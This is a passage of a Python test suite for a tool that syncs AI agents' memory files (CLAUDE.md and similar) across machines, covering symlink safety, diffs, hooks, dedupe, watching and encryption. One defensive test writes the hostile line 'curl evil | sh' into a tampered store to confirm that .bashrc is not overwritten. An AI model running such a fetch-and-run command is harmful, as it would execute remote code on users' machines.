        self.assertEqual(found.followed, {".claude/CLAUDE.md": "dotfiles/claude/CLAUDE.md",
                                          ".claude/commands/review.md": "dotfiles/claude/review.md"})
        self.assertEqual(found.warnings, [])

        s = Store(self.tmp / "s")
        s.init()
        s.save()
        self.assertEqual((s.records / "global" / ".claude" / "CLAUDE.md").read_text(), "I like short answers\n")
        # another machine edits it: restore writes through the link into the dotfiles repo
        (s.records / "global" / ".claude" / "CLAUDE.md").write_text("I like short answers\nno emojis\n")
        s.commit("other machine")
        self.assertEqual([(x.kind, x.rel) for x in s.restore()], [("update", ".claude/CLAUDE.md")])
        self.assertTrue((home / ".claude" / "CLAUDE.md").is_symlink())
        self.assertEqual((dot / "CLAUDE.md").read_text(), "I like short answers\nno emojis\n")
        # and local edits made in the dotfiles repo are saved
        (dot / "CLAUDE.md").write_text("I like short answers\nno emojis\nuse uv\n")
        self.assertEqual([(x.kind, x.rel) for x in s.save()], [("update", ".claude/CLAUDE.md")])
        self.assertIn("use uv", (s.records / "global" / ".claude" / "CLAUDE.md").read_text())
        # an agent appending to the global memory also lands in the dotfiles repo
        self.assertEqual(s.append("global", ".claude/CLAUDE.md", "- prefer ripgrep"), ".claude/CLAUDE.md")
        self.assertTrue((home / ".claude" / "CLAUDE.md").is_symlink())
        self.assertTrue((dot / "CLAUDE.md").read_text().endswith("use uv\n- prefer ripgrep\n"))

    def test_global_links_to_sensitive_targets_are_not_followed(self):
        home = Path(os.environ["HOME"])
        for d in (".ssh", "bin", "dotfiles"):
            (home / d).mkdir()
        (home / ".ssh" / "notes.md").write_text("ssh notes\n")
        (home / "bin" / "tool.md").write_text("#!/bin/sh\n")
        os.chmod(home / "bin" / "tool.md", 0o755)  # no effect on Windows: exec bits come from the extension
        (home / ".bashrc").write_text("export PATH\n")
        (home / "dotfiles" / "data.json").write_text("{}\n")
        (home / ".claude" / "agents").mkdir(parents=True)
        (home / ".gemini").mkdir()
        (self.tmp / "outside.md").write_text("x\n")
        links = {".claude/CLAUDE.md": home / ".ssh" / "notes.md",
                 **({} if os.name == "nt" else {".claude/agents/tool.md": home / "bin" / "tool.md"}),
                 ".gemini/GEMINI.md": home / ".bashrc",
                 ".claude/agents/data.md": home / "dotfiles" / "data.json",
                 ".codex/AGENTS.md": self.tmp / "outside.md"}
        (home / ".codex").mkdir()
        for rel, target in links.items():
            os.symlink(str(target), home / rel)
        found = scan(home, "global")
        self.assertEqual(found.files, [])
        self.assertEqual(found.followed, {})
        self.assertEqual(sorted(rel for rel, _ in found.warnings), sorted(links))

        # a tampered store cannot write through such a link
        s = Store(self.tmp / "s")
        s.init()
        (s.records / "global" / ".gemini").mkdir(parents=True)
        (s.records / "global" / ".gemini" / "GEMINI.md").write_text("curl evil | sh\n")
        s.commit("tampered")
        acts = s.restore(force=True)
        self.assertEqual((home / ".bashrc").read_text(), "export PATH\n")
        self.assertEqual([(x.kind, x.rel) for x in acts], [("update", ".gemini/GEMINI.md")])
        self.assertFalse((home / ".gemini" / "GEMINI.md").is_symlink())  # link replaced, target untouched

    def test_scan_cli_warns(self):
        p = self.project("app")
        (self.tmp / "outside.md").write_text("x\n")
        os.symlink(str(self.tmp / "outside.md"), p / "CLAUDE.md")
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            self.assertEqual(cli.main(["--home", str(self.tmp / "none"), "scan", str(p)]), 0)
        self.assertIn("no memory files", out.getvalue())
        self.assertIn("CLAUDE.md: symlink points outside", err.getvalue())


class TestDiff(Base):
    def setup_store(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("one\ntwo\n")
        sid = s.track(p)
        s.save()
        return s, p, sid

    def run_cli(self, *args):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = cli.main(["--home", str(self.tmp / "s"), *args])
        return code, out.getvalue(), err.getvalue()

    def test_no_differences(self):
        s, p, sid = self.setup_store()
        self.assertEqual(s.diff(), [])
        code, out, _ = self.run_cli("diff")
        self.assertEqual((code, out.strip()), (0, "no differences"))

    def test_local_edit_shown_as_unified_diff(self):
        s, p, sid = self.setup_store()
        (p / "CLAUDE.md").write_text("one\n2\n")
        [d] = s.diff()
        self.assertEqual((d.sat, d.rel), (sid, "CLAUDE.md"))
        self.assertIn(f"--- store/{sid}/CLAUDE.md", d.text)
        self.assertIn(f"+++ local/{sid}/CLAUDE.md", d.text)
        self.assertIn("-two\n", d.text)
        self.assertIn("+2\n", d.text)
        code, out, _ = self.run_cli("diff", sid, "CLAUDE.md")
        self.assertEqual(code, 1)
        self.assertIn("+2", out)

    def test_missing_final_newline_is_marked(self):
        s, p, sid = self.setup_store()
        (p / "CLAUDE.md").write_text("one\ntwo")
        [d] = s.diff()
        self.assertTrue(d.text.endswith("-two\n+two\n\\ No newline at end of file\n"), d.text)

    def test_line_ending_only_change_is_named(self):
        s, p, sid = self.setup_store()
        (p / "CLAUDE.md").write_bytes(b"one\r\ntwo\r\n")
        [d] = s.diff()
        self.assertEqual(d.text, f"{sid}/CLAUDE.md: only line endings differ (store LF, local CRLF)\n")

    def test_files_on_one_side_only(self):
        s, p, sid = self.setup_store()
        (p / "AGENTS.md").write_text("new here\n")
        (s.records / sid / "napkin.md").write_text("from elsewhere\n")
        s.commit("other machine")
        by_rel = {d.rel: d.text for d in s.diff([sid])}
        self.assertEqual(sorted(by_rel), ["AGENTS.md", "napkin.md"])
        self.assertIn("--- /dev/null", by_rel["AGENTS.md"])
        self.assertIn("+new here", by_rel["AGENTS.md"])
        self.assertIn("+++ /dev/null", by_rel["napkin.md"])
        self.assertIn("-from elsewhere", by_rel["napkin.md"])
        self.assertEqual([d.rel for d in s.diff([sid], "napkin.md")], ["napkin.md"])

    def test_help_documents_exit_code(self):
        from contextlib import redirect_stdout
        from io import StringIO
        out = StringIO()
        with redirect_stdout(out), self.assertRaises(SystemExit):
            cli.main(["diff", "--help"])
        self.assertIn("exit 1 if they do", " ".join(out.getvalue().split()))

    def test_track_counts_files_in_words(self):
        Store(self.tmp / "s").init(track_global=False)
        one = self.project("one")
        (one / "CLAUDE.md").write_text("x\n")
        two = self.project("two", remote="git@github.com:me/two.git")
        (two / "CLAUDE.md").write_text("x\n")
        (two / "AGENTS.md").write_text("y\n")
        _, out, _ = self.run_cli("track", str(one))
        self.assertIn("(1 memory file)", out)
        _, out, _ = self.run_cli("track", str(two))
        self.assertIn("(2 memory files)", out)

    def test_bad_arguments(self):
        s, p, sid = self.setup_store()
        code, _, err = self.run_cli("diff", "github.com/nope/nope")
        self.assertEqual(code, 2)
        self.assertIn("not tracked", err)
        code, _, err = self.run_cli("diff", sid, "README.md")
        self.assertEqual(code, 2)
        self.assertIn("not a memory", err)

    @unittest.skipUnless(can_symlink(), "symlinks not supported here")
    def test_link_difference_shown(self):
        s, p, sid = self.setup_store()
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        [d] = s.diff()
        self.assertEqual(d.rel, "AGENTS.md")
        self.assertIn("symlink", d.text)
        self.assertIn("store: (none)", d.text)
        self.assertIn("local: -> CLAUDE.md", d.text)

    def test_tampered_record_never_reads_local_file(self):
        s, p, sid = self.setup_store()
        (p / "run.sh").write_text("local secret script\n")
        (s.records / sid / "run.sh").write_text("x\n")
        s.commit("tampered")
        self.assertEqual(s.diff(), [])

    def test_conflict_message_points_to_diff(self):
        s, p, sid = self.setup_store()
        (s.records / sid / "CLAUDE.md").write_text("store v2\n")
        s.commit("other machine")
        (p / "CLAUDE.md").write_text("local v2\n")
        code, out, err = self.run_cli("restore")
        self.assertEqual(code, 1)
        self.assertIn(f"punk diff {sid} CLAUDE.md", err)


class TestHooks(Base):
    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "s")
        self.store.init(track_global=False)
        self.settings = Path(os.environ["HOME"]) / ".claude" / "settings.json"

    def cli(self, *args, stdin=""):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        old = sys.stdin
        sys.stdin = StringIO(stdin)
        try:
            with redirect_stdout(out), redirect_stderr(err):
                code = cli.main(["--home", str(self.store.root), *args])
        finally:
            sys.stdin = old
        return code, out.getvalue(), err.getvalue()

    def ours(self, settings):
        return [(event, g.get("matcher"), h["args"][-1]) for event, groups in settings.get("hooks", {}).items()
                for g in groups for h in g["hooks"] if "punk_records" in h.get("args", [])]

    def test_install_merges_and_is_idempotent(self):
        self.settings.parent.mkdir(parents=True)
        mine = {"type": "command", "command": "echo hi"}
        self.settings.write_text(json.dumps({"permissions": {"allow": ["Bash(ls)"]},
                                             "hooks": {"SessionStart": [{"matcher": "startup", "hooks": [mine]}]}}))
        code, out, _ = self.cli("install-hooks")
        self.assertEqual(code, 0, out)
        self.assertIn("installed", out)
        data = json.loads(self.settings.read_text())
        self.assertEqual(data["permissions"], {"allow": ["Bash(ls)"]})
        self.assertEqual(data["hooks"]["SessionStart"][0], {"matcher": "startup", "hooks": [mine]})
        self.assertEqual(self.ours(data), [("SessionStart", "startup|resume", "session-start"),
                                           ("SessionEnd", None, "session-end")])
        h = data["hooks"]["SessionEnd"][-1]["hooks"][0]
        self.assertEqual(h["command"], sys.executable)
        self.assertEqual(h["args"], ["-m", "punk_records", "--home", str(self.store.root.resolve()), "hook",
                                     "session-end"])
        self.assertEqual(h["timeout"], 30)
        self.assertTrue((self.settings.parent / "settings.json.punk-bak").is_file())
        before = self.settings.read_bytes()
        code, out, _ = self.cli("install-hooks")
        self.assertIn("already installed", out)
        self.assertEqual(self.settings.read_bytes(), before)

    def test_uninstall_removes_only_ours(self):
        self.settings.parent.mkdir(parents=True)
        mine = {"type": "command", "command": "echo bye"}
        self.settings.write_text(json.dumps({"hooks": {"SessionEnd": [{"hooks": [mine]}]}, "model": "x"}))
        self.cli("install-hooks")
        code, out, _ = self.cli("install-hooks", "--uninstall")
        self.assertEqual(code, 0)
        self.assertIn("removed", out)
        self.assertEqual(json.loads(self.settings.read_text()),
                         {"hooks": {"SessionEnd": [{"hooks": [mine]}]}, "model": "x"})
        self.cli("install-hooks")
        self.settings.write_text(json.dumps({"hooks": {"SessionStart": json.loads(
            self.settings.read_text())["hooks"]["SessionStart"][-1:]}}))
        self.cli("install-hooks", "--uninstall")
        self.assertEqual(json.loads(self.settings.read_text()), {})  # empty containers dropped

    def test_invalid_settings_are_never_overwritten(self):
        self.settings.parent.mkdir(parents=True)
        self.settings.write_text("{ not json")
        code, _, err = self.cli("install-hooks")
        self.assertEqual(code, 2)
        self.assertIn("not valid JSON", err)
        self.assertEqual(self.settings.read_text(), "{ not json")
        self.settings.write_text(json.dumps({"hooks": []}))
        self.assertEqual(self.cli("install-hooks")[0], 2)
        self.assertEqual(json.loads(self.settings.read_text()), {"hooks": []})

    def test_project_scope_uses_local_settings(self):
        p = self.project("app")
        code, out, _ = self.cli("install-hooks", "--project", str(p))
        self.assertEqual(code, 0)
        target = p / ".claude" / "settings.local.json"
        self.assertIn(str(target.resolve()), out)  # Windows temp dirs can be 8.3 short names (RUNNER~1)
        self.assertIn(".gitignore", out)  # not ignored yet: tell the user
        self.assertEqual(len(self.ours(json.loads(target.read_text()))), 2)
        self.assertFalse(self.settings.exists())

    def test_dry_run_writes_nothing(self):
        code, out, _ = self.cli("install-hooks", "--dry-run")
        self.assertEqual(code, 0)
        self.assertFalse(self.settings.exists())

    def test_session_start_restores_quietly(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = self.store.track(p)
        self.store.save()
        (self.store.records / sid / "CLAUDE.md").write_text("v2 from another machine\n")
        self.store.commit("other machine")
        code, out, err = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p / "sub")}))
        self.assertEqual((code, out), (0, ""))  # stdout would be added to Claude's context
        self.assertEqual((p / "CLAUDE.md").read_text(), "v2 from another machine\n")

    def test_session_start_reports_conflicts_to_the_user(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = self.store.track(p)
        self.store.save()
        (self.store.records / sid / "CLAUDE.md").write_text("store v2\n")
        self.store.commit("other machine")
        (p / "CLAUDE.md").write_text("local v2\n")
        code, out, _ = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 0)
        msg = json.loads(out)["systemMessage"]
        self.assertIn("conflict", msg)
        self.assertIn("punk diff", msg)
        self.assertEqual((p / "CLAUDE.md").read_text(), "local v2\n")

    def test_session_end_saves_and_pushes(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        git("remote", "add", "origin", str(remote), cwd=self.store.root)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("learned something\n")
        sid = self.store.track(p)
        other = self.project("other", remote="git@github.com:me/other.git")
        (other / "CLAUDE.md").write_text("not this one\n")
        self.store.track(other)
        code, out, err = self.cli("hook", "session-end", stdin=json.dumps({"cwd": str(p), "reason": "other"}))
        self.assertEqual(code, 0, err)
        self.assertEqual((self.store.records / sid / "CLAUDE.md").read_text(), "learned something\n")
        self.assertFalse((self.store.records / "github.com/me/other").exists())  # only this session's project
        pushed = subprocess.run(["git", "--git-dir", str(remote), "show", f"main:records/{sid}/CLAUDE.md"],
                                capture_output=True, text=True).stdout
        self.assertEqual(pushed, "learned something\n")

    def test_session_end_shows_blocked_secrets_on_exit(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("token ghp_" + "a" * 36 + "\n")
        self.store.track(p)
        code, _, err = self.cli("hook", "session-end", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 2)  # exit 2: stderr is shown to the user
        self.assertIn("blocked", err)

    def test_hooks_never_break_a_session(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("x\n")
        # untracked project, no global satellite: nothing to do
        self.assertEqual(self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)})), (0, "", ""))
        # unreachable remote: still restores locally, says so to the user only
        sid = self.store.track(p)
        self.store.save()
        git("remote", "add", "origin", str(self.tmp / "missing.git"), cwd=self.store.root)
        (self.store.records / sid / "CLAUDE.md").write_text("y\n")
        self.store.commit("other machine")
        code, out, _ = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 0)
        self.assertIn("could not reach", json.loads(out)["systemMessage"])
        self.assertEqual((p / "CLAUDE.md").read_text(), "y\n")
        # no store at all, bad stdin
        code = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(self.tmp / "none"),
                               "hook", "session-start"], input=b"not json", capture_output=True,
                              env={**os.environ, "PYTHONPATH": str(ROOT / "src")}).returncode
        self.assertEqual(code, 0)

    def test_unexpected_errors_are_reported_not_raised(self):
        p = self.project("app")
        self.store.track(p)
        self.store.state_path.write_text("{ corrupted")  # load_state raises a plain ValueError
        code, out, _ = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 0)
        self.assertIn("hook session-start failed", json.loads(out)["systemMessage"])
        code, _, err = self.cli("hook", "session-end", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 2)
        self.assertIn("hook session-end failed", err)

    def test_warns_when_hook_python_cannot_import_punk(self):
        from unittest import mock

        from punk_records import hooks
        with mock.patch.object(hooks, "runnable", return_value=False):
            code, _, err = self.cli("install-hooks")
        self.assertEqual(code, 0)
        self.assertIn("cannot import punk_records without PYTHONPATH", err)
        self.cli("install-hooks", "--uninstall")
        with mock.patch.object(hooks, "runnable", return_value=True):
            self.assertEqual(self.cli("install-hooks")[2], "")

    def test_installed_command_runs_as_written(self):
        """Run the exact exec-form command from settings.json, like Claude Code does (no shell)."""
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = self.store.track(p)
        self.store.save()
        (self.store.records / sid / "CLAUDE.md").write_text("v2\n")
        self.store.commit("other machine")
        self.cli("install-hooks")
        h = json.loads(self.settings.read_text())["hooks"]["SessionStart"][-1]["hooks"][0]
        r = subprocess.run([h["command"], *h["args"]], input=json.dumps({"cwd": str(p)}).encode(),
                           capture_output=True, env={**os.environ, "PYTHONPATH": str(ROOT / "src")})
        self.assertEqual((r.returncode, r.stdout), (0, b""), r.stderr)
        self.assertEqual((p / "CLAUDE.md").read_text(), "v2\n")


class TestDedupe(Base):
    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "s")
        self.store.init(track_global=False)
        self.p = self.project("app")
        (self.p / "CLAUDE.md").write_text("x\n")
        self.sid = self.store.track(self.p)
        self.store.save()

    def record(self, data: bytes, rel="CLAUDE.md"):
        (self.store.records / self.sid / rel).write_bytes(data)
        self.store.commit("union merge")
        self.store.restore()

    def cli(self, *args):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = cli.main(["--home", str(self.store.root), *args])
        return code, out.getvalue(), err.getvalue()

    def test_dedupe_lines_rules(self):
        from punk_records.dedupe import dedupe_lines
        text = ("# rules\n- docker needed\n\n## Notes\n- ci is slow\n- docker needed\n\n"
                "```python\nx = 1\nx = 1\n```\n```python\nx = 1\n```\n"
                "## Notes\n---\n---\n| a |\n|---|\n|---|\n  - nested\n  - nested\n- nested\n"
                "- trailing  \n- trailing\n")
        out, removed = dedupe_lines(text.encode())
        self.assertEqual([n for n, _ in removed], [6, 22, 25])
        self.assertEqual([t for _, t in removed], ["- docker needed", "  - nested", "- trailing"])
        self.assertEqual(out.decode(), text.replace("- ci is slow\n- docker needed\n", "- ci is slow\n")
                         .replace("  - nested\n  - nested\n", "  - nested\n")
                         .replace("- trailing  \n- trailing\n", "- trailing  \n"))

    def test_code_blocks_are_never_touched(self):
        from punk_records.dedupe import dedupe_lines
        cases = {
            # a ~~~ block showing a ``` fence: the inner line must not close it
            b"~~~\n```\nx = 1\nx = 1\n```\n~~~\n- a\n- a\n": [(8, "- a")],
            # a longer fence is closed only by an equal or longer fence of the same kind
            b"````\n```\nfoo\nfoo\n```\n````\n- b\n- b\n": [(8, "- b")],
            # a fence line with text after it does not close the block
            b"```\n``` not a close\ny\ny\n```\n- c\n- c\n": [(7, "- c")],
            # indented (4 spaces or tab) code
            b"Example:\n\n    make test\n    make test\n\tgo\n\tgo\n- d\n- d\n": [(8, "- d")],
        }
        for data, expected in cases.items():
            self.assertEqual(dedupe_lines(data)[1], expected, data)

    def test_line_endings_and_final_newline_kept(self):
        from punk_records.dedupe import dedupe_lines
        self.assertEqual(dedupe_lines(b"a\r\nb\r\na\r\n")[0], b"a\r\nb\r\n")
        self.assertEqual(dedupe_lines(b"a\nb\na")[0], b"a\nb\n")
        self.assertEqual(dedupe_lines(b"a\nb\n"), (b"a\nb\n", []))

    def test_dry_run_by_default(self):
        self.record(b"- a\n- b\n- a\n")
        before = self.store.git("rev-parse", "HEAD").stdout
        code, out, _ = self.cli("dedupe")
        self.assertEqual(code, 1)  # like `punk diff`: duplicates found
        self.assertIn(f"{self.sid}/CLAUDE.md:3: - a", out)
        self.assertIn("--apply", out)
        self.assertEqual((self.store.records / self.sid / "CLAUDE.md").read_bytes(), b"- a\n- b\n- a\n")
        self.assertEqual(self.store.git("rev-parse", "HEAD").stdout, before)

    def test_apply_commits_and_restores(self):
        self.record(b"- a\n- b\n- a\n")
        code, out, _ = self.cli("dedupe", "--apply")
        self.assertEqual(code, 0, out)
        self.assertEqual((self.store.records / self.sid / "CLAUDE.md").read_bytes(), b"- a\n- b\n")
        self.assertEqual((self.p / "CLAUDE.md").read_bytes(), b"- a\n- b\n")
        self.assertIn("dedupe", self.store.git("log", "-1", "--format=%s").stdout)
        self.assertEqual(self.cli("dedupe"), (0, "no duplicate lines\n", ""))
        self.assertEqual(self.store.save(), [])

    def test_apply_never_clobbers_local_edits(self):
        self.record(b"- a\n- b\n- a\n")
        (self.p / "CLAUDE.md").write_bytes(b"- a\n- b\n- a\n- local edit\n")
        code, out, err = self.cli("dedupe", "--apply")
        self.assertEqual(code, 1)
        self.assertIn("conflict", out)
        self.assertEqual((self.p / "CLAUDE.md").read_bytes(), b"- a\n- b\n- a\n- local edit\n")

    def test_filters(self):
        self.record(b"- a\n- a\n")
        (self.store.records / self.sid / "AGENTS.md").write_bytes(b"- z\n- z\n")
        self.store.commit("more")
        _, out, _ = self.cli("dedupe", self.sid, "AGENTS.md")
        self.assertIn("AGENTS.md:2: - z", out)
        self.assertNotIn("CLAUDE.md", out)
        self.assertEqual(self.cli("dedupe", "github.com/nope/nope")[0], 2)
        self.assertEqual(self.cli("dedupe", self.sid, "napkin.md")[0], 2)

    def test_non_utf8_files_are_left_alone(self):
        (self.store.records / self.sid / "napkin.md").write_bytes(b"caf\xe9\ncaf\xe9\n")
        self.store.commit("latin-1 file")
        self.assertEqual(self.cli("dedupe")[1], "no duplicate lines\n")
        self.assertEqual((self.store.records / self.sid / "napkin.md").read_bytes(), b"caf\xe9\ncaf\xe9\n")

    def test_real_union_merge_duplicate(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        git("remote", "add", "origin", str(remote), cwd=self.store.root)
        (self.p / "CLAUDE.md").write_text("# rules\n- tabs\n\n## Notes\n- ci is slow\n")
        self.store.sync()
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        b.sync()
        (self.p / "CLAUDE.md").write_text("# rules\n- tabs\n- docker needed\n\n## Notes\n- ci is slow\n")
        (pb / "CLAUDE.md").write_text("# rules\n- tabs\n\n## Notes\n- ci is slow\n- docker needed\n")
        self.store.sync()
        b.sync()
        self.store.sync()
        self.assertEqual((self.p / "CLAUDE.md").read_text().count("- docker needed"), 2)
        self.cli("dedupe", "--apply")
        self.assertEqual((self.p / "CLAUDE.md").read_text(),
                         "# rules\n- tabs\n- docker needed\n\n## Notes\n- ci is slow\n")


class TestWatch(Base):
    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "s")
        self.store.init(track_global=False)
        self.p = self.project("app")
        (self.p / "CLAUDE.md").write_text("v1\n")
        self.sid = self.store.track(self.p)
        self.store.save()
        self.lines = []

    def watcher(self, **kw):
        from punk_records.watch import Watcher
        return Watcher(self.store, out=self.lines.append, **kw)

    def record(self):
        return (self.store.records / self.sid / "CLAUDE.md").read_text()

    def edit(self, text, bump):
        f = self.p / "CLAUDE.md"
        f.write_text(text)
        st = f.stat()
        os.utime(f, ns=(st.st_atime_ns, st.st_mtime_ns + bump))  # make the change visible to mtime polling

    def test_saves_after_changes_settle(self):
        w = self.watcher(debounce=2)
        w.tick(0)
        self.edit("v2\n", 1_000_000_000)
        w.tick(1)  # change seen, waiting for it to settle
        self.assertEqual(self.record(), "v1\n")
        self.edit("v3\n", 2_000_000_000)
        w.tick(2.5)  # still changing: the timer restarts
        self.assertEqual(self.record(), "v1\n")
        w.tick(4)  # 1.5 s quiet: not yet
        self.assertEqual(self.record(), "v1\n")
        w.tick(4.6)  # 2.1 s quiet: save once
        self.assertEqual(self.record(), "v3\n")
        self.assertTrue(any("update" in x and "CLAUDE.md" in x for x in self.lines), self.lines)
        commits = self.store.git("rev-list", "--count", "HEAD").stdout.strip()
        w.tick(10)
        self.assertEqual(self.store.git("rev-list", "--count", "HEAD").stdout.strip(), commits)

    def test_start_saves_edits_made_while_not_watching(self):
        self.edit("offline edit\n", 1_000_000_000)
        self.watcher().start()
        self.assertEqual(self.record(), "offline edit\n")

    def test_new_files_are_noticed_at_the_next_rescan(self):
        from unittest import mock
        w = self.watcher(debounce=0, rescan=10)
        w.tick(0)
        (self.p / "napkin.md").write_text("new\n")
        with mock.patch("punk_records.watch.scan", side_effect=AssertionError("walked the tree")):
            w.tick(1)  # between rescans: only known files are checked, no directory walk
            w.tick(2)
        self.assertFalse((self.store.records / self.sid / "napkin.md").exists())
        w.tick(10)  # full rescan finds it
        w.tick(11)
        self.assertEqual((self.store.records / self.sid / "napkin.md").read_text(), "new\n")

    def test_known_files_are_checked_every_look(self):
        w = self.watcher(debounce=0, rescan=1000)
        w.tick(0)
        self.edit("v2\n", 1_000_000_000)
        w.tick(1)
        w.tick(2)
        self.assertEqual(self.record(), "v2\n")
        (self.p / "CLAUDE.md").unlink()  # a deleted file is a change too
        w.tick(3)
        w.tick(4)
        self.assertFalse((self.store.records / self.sid / "CLAUDE.md").exists())

    @unittest.skipUnless(can_symlink(), "symlinks not supported here")
    def test_edits_through_followed_dotfile_links_are_seen(self):
        home = Path(os.environ["HOME"])
        (home / "dotfiles").mkdir()
        (home / "dotfiles" / "CLAUDE.md").write_text("prefs\n")
        (home / ".claude").mkdir()
        os.symlink(os.path.join("..", "dotfiles", "CLAUDE.md"), home / ".claude" / "CLAUDE.md")
        self.store.track(home, sid="global", kind="global")
        w = self.watcher(debounce=0, rescan=1000)
        w.tick(0)
        f = home / "dotfiles" / "CLAUDE.md"
        f.write_text("prefs\nmore\n")
        st = f.stat()
        os.utime(f, ns=(st.st_atime_ns, st.st_mtime_ns + 1_000_000_000))
        w.tick(1)
        w.tick(2)
        self.assertEqual((self.store.records / "global" / ".claude" / "CLAUDE.md").read_text(), "prefs\nmore\n")

    def test_sync_every(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        git("remote", "add", "origin", str(remote), cwd=self.store.root)
        w = self.watcher(sync_every=60)
        w.tick(0)
        w.tick(30)
        self.assertNotEqual(subprocess.run(["git", "--git-dir", str(remote), "rev-parse", "main"],
                                           capture_output=True).returncode, 0)  # nothing pushed yet
        w.tick(61)
        pushed = subprocess.run(["git", "--git-dir", str(remote), "show", f"main:records/{self.sid}/CLAUDE.md"],
                                capture_output=True, text=True).stdout
        self.assertEqual(pushed, "v1\n")

    def test_errors_are_reported_and_watching_continues(self):
        from unittest import mock
        w = self.watcher(debounce=0)
        w.tick(0)
        self.edit("v2\n", 1_000_000_000)
        with mock.patch.object(self.store, "save", side_effect=PunkError("git add -A failed: index.lock")):
            w.tick(1)
            w.tick(2)
        self.assertTrue(any("index.lock" in x for x in self.lines), self.lines)
        w.tick(3)  # the change is still pending: retried
        self.assertEqual(self.record(), "v2\n")

    def test_only_given_satellites_and_missing_roots(self):
        other = self.project("other", remote="git@github.com:me/other.git")
        (other / "CLAUDE.md").write_text("o1\n")
        osid = self.store.track(other)
        self.store.save()
        w = self.watcher(ids=[self.sid], debounce=0)
        w.tick(0)
        (other / "CLAUDE.md").write_text("o2\n")
        self.edit("v2\n", 1_000_000_000)
        w.tick(1)
        w.tick(2)
        self.assertEqual(self.record(), "v2\n")
        self.assertEqual((self.store.records / osid / "CLAUDE.md").read_text(), "o1\n")
        import shutil
        shutil.rmtree(self.p)  # a tracked project that is gone must not stop the watcher
        w.tick(3)
        w.tick(4)

    def test_cli_rejects_bad_timings_and_ids(self):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        from unittest import mock
        # if validation were missing, the watcher would start: stop it at the first sleep instead of hanging
        with mock.patch("punk_records.watch.time.sleep", side_effect=KeyboardInterrupt), \
                redirect_stdout(StringIO()), redirect_stderr(StringIO()):
            for args in (["--interval", "0"], ["--debounce", "-1"]):
                with self.assertRaises(SystemExit) as e:
                    cli.main(["--home", str(self.store.root), "watch", *args])
                self.assertEqual(e.exception.code, 2)
            self.assertEqual(cli.main(["--home", str(self.store.root), "watch", "github.com/nope/nope"]), 2)

    def test_cli_runs_until_interrupted(self):
        from contextlib import redirect_stdout
        from io import StringIO
        from unittest import mock
        self.edit("offline edit\n", 1_000_000_000)
        out = StringIO()
        with mock.patch("punk_records.watch.time.sleep", side_effect=KeyboardInterrupt), redirect_stdout(out):
            code = cli.main(["--home", str(self.store.root), "watch", "--interval", "1"])
        self.assertEqual(code, 0)
        self.assertIn("watching 1 satellite", out.getvalue())
        self.assertIn("stopped", out.getvalue())
        self.assertEqual(self.record(), "offline edit\n")


def have_age():
    import shutil
    return bool(shutil.which("age") and shutil.which("age-keygen"))


@unittest.skipUnless(have_age(), "age is not installed")
class TestEncryption(Base):
    def setUp(self):
        super().setUp()
        self.remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(self.remote), cwd=self.tmp)
        self.key_a = self.tmp / "keys" / "a.key"
        os.environ["PUNK_AGE_KEY"] = str(self.key_a)

    def machine(self, name, key=None, join=False):
        if key:
            os.environ["PUNK_AGE_KEY"] = str(key)
        s = Store(self.tmp / f"{name}-store")
        if join:
            s.init(machine=name, track_global=False, encrypted=str(self.remote))
        else:
            s.init(machine=name, track_global=False)
        p = self.project(f"{name}/app")
        return s, p

    def crypt(self, store):
        from punk_records.crypt import Crypt
        return Crypt(store)

    def remote_files(self):
        r = subprocess.run(["git", "--git-dir", str(self.remote), "ls-tree", "-r", "--name-only", "main"],
                           capture_output=True, text=True)
        return r.stdout.split()

    def test_two_machines_share_an_encrypted_remote(self):
        a, pa = self.machine("a")
        (pa / "CLAUDE.md").write_text("# rules\n- secret sauce: use tabs\n")
        sid = a.track(pa)
        self.crypt(a).setup(str(self.remote))
        self.assertTrue(self.key_a.is_file())
        if os.name != "nt":
            self.assertEqual(self.key_a.stat().st_mode & 0o777, 0o600)
        a.sync()
        self.assertEqual(self.remote_files(), ["punk-records.bundle.age"])
        blob = subprocess.run(["git", "--git-dir", str(self.remote), "cat-file", "blob",
                               "main:punk-records.bundle.age"], capture_output=True).stdout
        self.assertTrue(blob.startswith(b"age-encryption.org/v1"))
        self.assertNotIn(b"secret sauce", blob)
        self.assertNotIn(b"CLAUDE.md", blob)

        b, pb = self.machine("b", join=True)  # same key file, as if copied
        b.track(pb)
        b.sync()
